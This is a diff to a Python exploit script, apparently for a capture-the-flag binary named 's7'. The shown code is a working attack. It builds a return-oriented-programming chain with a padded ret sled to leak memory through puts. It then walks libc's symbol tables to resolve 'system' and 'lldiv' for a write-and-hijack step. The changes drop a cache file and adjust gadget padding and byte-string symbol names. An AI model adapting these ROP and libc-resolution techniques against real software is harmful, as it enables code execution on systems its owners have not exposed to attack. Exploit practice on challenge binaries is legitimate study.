@@ -13,29 +13,10 @@ class LibcMap:
     libc_map = {}
     last_scanned_offset = 0
 
-    def __init__(self, cache="./~libcmap"):
-        self.cache = cache
-        self.restore()
-
-    def restore(self):
-        try:
-            with open(self.cache,'r') as f:
-                state = json.loads(f.read())
-                self.libc_map = state["libc_map"]
-                self.last_scanned_offset = state["last_scanned_offset"]
-        except:
-            print( "error reading cached libcmap")
-
-    def save(self):
-        with open(self.cache,'w') as f:
-            state = { "libc_map" : self.libc_map, "last_scanned_offset": self.last_scanned_offset }
-            f.write(json.dumps(state))
-
     def put(self, symbol, address, scanned_offset):
         if address != 0:
             self.libc_map[str(symbol,'utf-8')] = address
         self.last_scanned_offset = scanned_offset
-        self.save()
 
     def get(self, symbol):
         if symbol in self.libc_map:
@@ -66,7 +47,30 @@ def leak(address):
         0x00400703, # pop rdi; ret;
         address,    # leak
         0x004004c0, # puts@plt
-        0x0040060d, # main again
+                0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+        0x00400704, # ret
+
+        0x00400520, # entry point again
         )
 
     
@@ -86,6 +90,7 @@ def leak(address):
         result = ""
 
     if not s7.isalive():
+        print("died leaking address: " + hex(address))
         raise 
 
     return result
@@ -186,6 +191,8 @@ def get_symbol(symbol, strtab, symtab, libc_map):
 
             libc_map.put(sym, sym_addr, i)
 
+            #print("sym: " + str(sym, 'utf-8'))
+
             if sym == symbol:
                 return sym_addr
 
@@ -272,9 +279,6 @@ def write(address, data, div_addr):
         raise 
 
 
-
-
-
 counter = 0
 
 while True:
@@ -316,13 +320,12 @@ while True:
                 print ("symtab " + hex(symtab))
 
             if system == None:
-                system = get_symbol("system", strtab, symtab, libc_map)
+                system = get_symbol(b"system", strtab, symtab, libc_map)
             
             if lldiv == None:
-                lldiv = get_symbol("lldiv", strtab, symtab, libc_map)
+                lldiv = get_symbol(b"lldiv", strtab, symtab, libc_map)
 
                     
-
     except Exception as e:
         counter += 1
         setup = binexpect.setup("./s7")
